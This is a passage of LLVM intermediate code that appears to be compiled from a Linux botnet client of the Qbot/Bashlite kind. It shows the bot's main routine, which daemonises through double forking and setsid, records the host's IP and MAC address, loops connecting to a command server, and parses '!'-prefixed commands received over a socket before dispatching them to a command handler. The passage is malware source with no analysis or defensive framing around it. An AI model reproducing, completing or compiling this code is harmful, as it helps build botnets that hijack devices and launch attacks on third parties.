  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.77, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79

; <label>:97:                                     ; preds = %79
  br label %98

; <label>:98:                                     ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

; <label>:101:                                    ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [50 x i8], align 16
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i32, align 4
  %11 = alloca [11 x i8], align 1
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca [4096 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca [10 x i8*], align 16
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %28 = bitcast [50 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %28, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @main.ismokeweed, i32 0, i32 0), i64 50, i32 16, i1 false)
  %29 = load i32, i32* %6, align 4
  store i32 %29, i32* %10, align 4
  %30 = bitcast [11 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %30, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @main.r00t3d, i32 0, i32 0), i64 11, i32 1, i1 false)
  %31 = getelementptr inbounds [50 x i8], [50 x i8]* %8, i32 0, i32 0
  %32 = call %struct._IO_FILE* @fopen(i8* %31, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.79, i32 0, i32 0))
  store %struct._IO_FILE* %32, %struct._IO_FILE** %9, align 8
  %33 = getelementptr inbounds [11 x i8], [11 x i8]* %11, i32 0, i32 0
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %35 = call i64 @fwrite(i8* %33, i64 1, i64 11, %struct._IO_FILE* %34)
  %36 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %37 = call i32 @fileno(%struct._IO_FILE* %36) #2
  %38 = call i32 (i32, i32, ...) bitcast (i32 (...)* @fchmod to i32 (i32, i32, ...)*)(i32 %37, i32 3071)
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %40 = call i32 @fileno(%struct._IO_FILE* %39) #2
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = call i32 (i32, i64, ...) @ioctl(i32 %40, i64 %42, i32* %10) #2
  %44 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %45 = call i32 @fclose(%struct._IO_FILE* %44)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = call i32 @getpid() #2
  %48 = xor i32 %46, %47
  call void @srand(i32 %48) #2
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %50 = call i32 @getpid() #2
  %51 = xor i32 %49, %50
  call void @init_rand(i32 %51)
  %52 = call i32 @getOurIP()
  %53 = call i32 @fork() #2
  store i32 %53, i32* %12, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %2
  %56 = load i32, i32* %12, align 4
  %57 = call i32 @waitpid(i32 %56, i32* %14, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:58:                                     ; preds = %2
  %59 = load i32, i32* %12, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %73, label %61

; <label>:61:                                     ; preds = %58
  %62 = call i32 @fork() #2
  store i32 %62, i32* %13, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %64, label %65

; <label>:64:                                     ; preds = %61
  call void @exit(i32 0) #14
  unreachable

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* %13, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %69, label %68

; <label>:68:                                     ; preds = %65
  br label %71

; <label>:69:                                     ; preds = %65
  %70 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0))
  br label %71

; <label>:71:                                     ; preds = %69, %68
  br label %72

; <label>:72:                                     ; preds = %71
  br label %75

; <label>:73:                                     ; preds = %58
  %74 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0))
  br label %75

; <label>:75:                                     ; preds = %73, %72
  br label %76

; <label>:76:                                     ; preds = %75
  %77 = call i32 @setsid() #2
  %78 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #2
  %79 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %80

; <label>:80:                                     ; preds = %343, %83, %76
  %81 = call i32 @initConnection()
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %83, label %85

; <label>:83:                                     ; preds = %80
  %84 = call i32 @sleep(i32 5)
  br label %80

; <label>:85:                                     ; preds = %80
  store i32 0, i32* %16, align 4
  store i32 0, i32* %17, align 4
  br label %86

; <label>:86:                                     ; preds = %342, %213, %175, %85
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %89 = call i32 @recvLine(i32 %87, i8* %88, i32 4096)
  store i32 %89, i32* %16, align 4
  %90 = icmp ne i32 %89, -1
  br i1 %90, label %91, label %343

; <label>:91:                                     ; preds = %86
  store i32 0, i32* %17, align 4
  br label %92

; <label>:92:                                     ; preds = %163, %91
  %93 = load i32, i32* %17, align 4
  %94 = sext i32 %93 to i64
  %95 = load i64, i64* @numpids, align 8
  %96 = icmp ult i64 %94, %95
  br i1 %96, label %97, label %166

; <label>:97:                                     ; preds = %92
  %98 = load i32*, i32** @pids, align 8
  %99 = load i32, i32* %17, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i32, i32* %98, i64 %100
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @waitpid(i32 %102, i32* null, i32 1)
  %104 = icmp sgt i32 %103, 0
  br i1 %104, label %105, label %162

; <label>:105:                                    ; preds = %97
  %106 = load i32, i32* %17, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %19, align 4
  br label %108

; <label>:108:                                    ; preds = %124, %105
  %109 = load i32, i32* %19, align 4
  %110 = zext i32 %109 to i64
  %111 = load i64, i64* @numpids, align 8
  %112 = icmp ult i64 %110, %111
  br i1 %112, label %113, label %127

; <label>:113:                                    ; preds = %108
  %114 = load i32*, i32** @pids, align 8
  %115 = load i32, i32* %19, align 4
  %116 = zext i32 %115 to i64
  %117 = getelementptr inbounds i32, i32* %114, i64 %116
  %118 = load i32, i32* %117, align 4
  %119 = load i32*, i32** @pids, align 8
  %120 = load i32, i32* %19, align 4
  %121 = sub i32 %120, 1
  %122 = zext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %119, i64 %122
  store i32 %118, i32* %123, align 4
  br label %124

; <label>:124:                                    ; preds = %113
  %125 = load i32, i32* %19, align 4
  %126 = add i32 %125, 1
  store i32 %126, i32* %19, align 4
  br label %108

; <label>:127:                                    ; preds = %108
  %128 = load i32*, i32** @pids, align 8
  %129 = load i32, i32* %19, align 4
  %130 = sub i32 %129, 1
  %131 = zext i32 %130 to i64
  %132 = getelementptr inbounds i32, i32* %128, i64 %131
  store i32 0, i32* %132, align 4
  %133 = load i64, i64* @numpids, align 8
  %134 = add i64 %133, -1
  store i64 %134, i64* @numpids, align 8
  %135 = load i64, i64* @numpids, align 8
  %136 = add i64 %135, 1
  %137 = mul i64 %136, 4
  %138 = call noalias i8* @malloc(i64 %137) #2
  %139 = bitcast i8* %138 to i32*
  store i32* %139, i32** %18, align 8
  store i32 0, i32* %19, align 4
  br label %140

; <label>:140:                                    ; preds = %155, %127
  %141 = load i32, i32* %19, align 4
  %142 = zext i32 %141 to i64
  %143 = load i64, i64* @numpids, align 8
  %144 = icmp ult i64 %142, %143
  br i1 %144, label %145, label %158

; <label>:145:                                    ; preds = %140
  %146 = load i32*, i32** @pids, align 8
  %147 = load i32, i32* %19, align 4
  %148 = zext i32 %147 to i64
  %149 = getelementptr inbounds i32, i32* %146, i64 %148
  %150 = load i32, i32* %149, align 4
  %151 = load i32*, i32** %18, align 8
  %152 = load i32, i32* %19, align 4
  %153 = zext i32 %152 to i64
  %154 = getelementptr inbounds i32, i32* %151, i64 %153
  store i32 %150, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %145
  %156 = load i32, i32* %19, align 4
  %157 = add i32 %156, 1
  store i32 %157, i32* %19, align 4
  br label %140

; <label>:158:                                    ; preds = %140
  %159 = load i32*, i32** @pids, align 8
  %160 = bitcast i32* %159 to i8*
  call void @free(i8* %160) #2
  %161 = load i32*, i32** %18, align 8
  store i32* %161, i32** @pids, align 8
  br label %162

; <label>:162:                                    ; preds = %158, %97
  br label %163

; <label>:163:                                    ; preds = %162
  %164 = load i32, i32* %17, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %17, align 4
  br label %92

; <label>:166:                                    ; preds = %92
  %167 = load i32, i32* %16, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 %168
  store i8 0, i8* %169, align 1
  %170 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  call void @trim(i8* %170)
  %171 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %172 = call i8* @strstr(i8* %171, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i32 0, i32 0)) #10
  %173 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %174 = icmp eq i8* %172, %173
  br i1 %174, label %175, label %178

; <label>:175:                                    ; preds = %166
  %176 = load i32, i32* @mainCommSock, align 4
  %177 = call i32 (i32, i8*, ...) @sockprintf(i32 %176, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.82, i32 0, i32 0))
  br label %86

; <label>:178:                                    ; preds = %166
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %180 = call i8* @strstr(i8* %179, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i32 0, i32 0)) #10
  %181 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %182 = icmp eq i8* %180, %181
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %178
  call void @exit(i32 0) #14
  unreachable

; <label>:184:                                    ; preds = %178
  %185 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  store i8* %185, i8** %20, align 8
  %186 = load i8*, i8** %20, align 8
  %187 = load i8, i8* %186, align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 33
  br i1 %189, label %190, label %342

; <label>:190:                                    ; preds = %184
  %191 = load i8*, i8** %20, align 8
  %192 = getelementptr inbounds i8, i8* %191, i64 1
  store i8* %192, i8** %21, align 8
  br label %193

; <label>:193:                                    ; preds = %205, %190
  %194 = load i8*, i8** %21, align 8
  %195 = load i8, i8* %194, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp ne i32 %196, 32
  br i1 %197, label %198, label %203

; <label>:198:                                    ; preds = %193
  %199 = load i8*, i8** %21, align 8
  %200 = load i8, i8* %199, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp ne i32 %201, 0
  br label %203

; <label>:203:                                    ; preds = %198, %193
  %204 = phi i1 [ false, %193 ], [ %202, %198 ]
  br i1 %204, label %205, label %208

; <label>:205:                                    ; preds = %203
  %206 = load i8*, i8** %21, align 8
  %207 = getelementptr inbounds i8, i8* %206, i32 1
  store i8* %207, i8** %21, align 8
  br label %193

; <label>:208:                                    ; preds = %203
  %209 = load i8*, i8** %21, align 8
  %210 = load i8, i8* %209, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 0
  br i1 %212, label %213, label %214

; <label>:213:                                    ; preds = %208
  br label %86

; <label>:214:                                    ; preds = %208
  %215 = load i8*, i8** %21, align 8
  store i8 0, i8* %215, align 1
  %216 = load i8*, i8** %20, align 8
  %217 = getelementptr inbounds i8, i8* %216, i64 1
  store i8* %217, i8** %21, align 8
  %218 = load i8*, i8** %20, align 8
  %219 = load i8*, i8** %21, align 8
  %220 = call i64 @strlen(i8* %219) #10
  %221 = getelementptr inbounds i8, i8* %218, i64 %220
  %222 = getelementptr inbounds i8, i8* %221, i64 2
  store i8* %222, i8** %20, align 8
  br label %223

; <label>:223:                                    ; preds = %243, %214
  %224 = load i8*, i8** %20, align 8
  %225 = load i8*, i8** %20, align 8
  %226 = call i64 @strlen(i8* %225) #10
  %227 = sub i64 %226, 1
  %228 = getelementptr inbounds i8, i8* %224, i64 %227
  %229 = load i8, i8* %228, align 1
  %230 = zext i8 %229 to i32
  %231 = icmp eq i32 %230, 10
  br i1 %231, label %241, label %232

; <label>:232:                                    ; preds = %223
  %233 = load i8*, i8** %20, align 8
  %234 = load i8*, i8** %20, align 8
  %235 = call i64 @strlen(i8* %234) #10
  %236 = sub i64 %235, 1
  %237 = getelementptr inbounds i8, i8* %233, i64 %236
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 13
  br label %241

; <label>:241:                                    ; preds = %232, %223
  %242 = phi i1 [ true, %223 ], [ %240, %232 ]
  br i1 %242, label %243, label %249

; <label>:243:                                    ; preds = %241
  %244 = load i8*, i8** %20, align 8
  %245 = load i8*, i8** %20, align 8
  %246 = call i64 @strlen(i8* %245) #10
  %247 = sub i64 %246, 1
  %248 = getelementptr inbounds i8, i8* %244, i64 %247
  store i8 0, i8* %248, align 1
  br label %223

; <label>:249:                                    ; preds = %241
  %250 = load i8*, i8** %20, align 8
  store i8* %250, i8** %22, align 8
  br label %251

; <label>:251:                                    ; preds = %263, %249
  %252 = load i8*, i8** %20, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp ne i32 %254, 32
  br i1 %255, label %256, label %261

; <label>:256:                                    ; preds = %251
  %257 = load i8*, i8** %20, align 8
  %258 = load i8, i8* %257, align 1
  %259 = zext i8 %258 to i32
  %260 = icmp ne i32 %259, 0
  br label %261

; <label>:261:                                    ; preds = %256, %251
  %262 = phi i1 [ false, %251 ], [ %260, %256 ]
  br i1 %262, label %263, label %266

; <label>:263:                                    ; preds = %261
  %264 = load i8*, i8** %20, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %20, align 8
  br label %251

; <label>:266:                                    ; preds = %261
  %267 = load i8*, i8** %20, align 8
  store i8 0, i8* %267, align 1
  %268 = load i8*, i8** %20, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %20, align 8
  %270 = load i8*, i8** %22, align 8
  store i8* %270, i8** %23, align 8
  br label %271

; <label>:271:                                    ; preds = %275, %266
  %272 = load i8*, i8** %23, align 8
  %273 = load i8, i8* %272, align 1
  %274 = icmp ne i8 %273, 0
  br i1 %274, label %275, label %284

; <label>:275:                                    ; preds = %271
  %276 = load i8*, i8** %23, align 8
  %277 = load i8, i8* %276, align 1
  %278 = zext i8 %277 to i32
  %279 = call i32 @toupper(i32 %278) #10
  %280 = trunc i32 %279 to i8
  %281 = load i8*, i8** %23, align 8
  store i8 %280, i8* %281, align 1
  %282 = load i8*, i8** %23, align 8
  %283 = getelementptr inbounds i8, i8* %282, i32 1
  store i8* %283, i8** %23, align 8
  br label %271

; <label>:284:                                    ; preds = %271
  store i32 1, i32* %25, align 4
  %285 = load i8*, i8** %20, align 8
  %286 = call i8* @strtok(i8* %285, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %286, i8** %26, align 8
  %287 = load i8*, i8** %22, align 8
  %288 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 0
  store i8* %287, i8** %288, align 16
  br label %289

; <label>:289:                                    ; preds = %320, %284
  %290 = load i8*, i8** %26, align 8
  %291 = icmp ne i8* %290, null
  br i1 %291, label %292, label %322

; <label>:292:                                    ; preds = %289
  %293 = load i8*, i8** %26, align 8
  %294 = load i8, i8* %293, align 1
  %295 = zext i8 %294 to i32
  %296 = icmp ne i32 %295, 10
  br i1 %296, label %297, label %320

; <label>:297:                                    ; preds = %292
  %298 = load i8*, i8** %26, align 8
  %299 = call i64 @strlen(i8* %298) #10
  %300 = add i64 %299, 1
  %301 = call noalias i8* @malloc(i64 %300) #2
  %302 = load i32, i32* %25, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %303
  store i8* %301, i8** %304, align 8
  %305 = load i32, i32* %25, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %306
  %308 = load i8*, i8** %307, align 8
  %309 = load i8*, i8** %26, align 8
  %310 = call i64 @strlen(i8* %309) #10
  %311 = add i64 %310, 1
  call void @llvm.memset.p0i8.i64(i8* %308, i8 0, i64 %311, i32 1, i1 false)
  %312 = load i32, i32* %25, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %313
  %315 = load i8*, i8** %314, align 8
  %316 = load i8*, i8** %26, align 8
  %317 = call i8* @strcpy(i8* %315, i8* %316) #2
  %318 = load i32, i32* %25, align 4
  %319 = add nsw i32 %318, 1
  store i32 %319, i32* %25, align 4
  br label %320

; <label>:320:                                    ; preds = %297, %292
  %321 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %321, i8** %26, align 8
  br label %289

; <label>:322:                                    ; preds = %289
  %323 = load i32, i32* %25, align 4
  %324 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i32 0, i32 0
  call void @processCmd(i32 %323, i8** %324)
  %325 = load i32, i32* %25, align 4
  %326 = icmp sgt i32 %325, 1
  br i1 %326, label %327, label %341

; <label>:327:                                    ; preds = %322
  store i32 1, i32* %27, align 4
  store i32 1, i32* %27, align 4
  br label %328

; <label>:328:                                    ; preds = %337, %327
  %329 = load i32, i32* %27, align 4
  %330 = load i32, i32* %25, align 4
  %331 = icmp slt i32 %329, %330
  br i1 %331, label %332, label %340

; <label>:332:                                    ; preds = %328
  %333 = load i32, i32* %27, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %334
  %336 = load i8*, i8** %335, align 8
  call void @free(i8* %336) #2
  br label %337

; <label>:337:                                    ; preds = %332
  %338 = load i32, i32* %27, align 4
  %339 = add nsw i32 %338, 1
  store i32 %339, i32* %27, align 4
  br label %328

; <label>:340:                                    ; preds = %328
  br label %341

; <label>:341:                                    ; preds = %340, %322
  br label %342

; <label>:342:                                    ; preds = %341, %184
  br label %86

; <label>:343:                                    ; preds = %86
  br label %80
                                                  ; No predecessors!
  %345 = load i32, i32* %3, align 4
  ret i32 %345
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i64 @fwrite(i8*, i64, i64, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @fileno(%struct._IO_FILE*) #4

declare i32 @fchmod(...) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

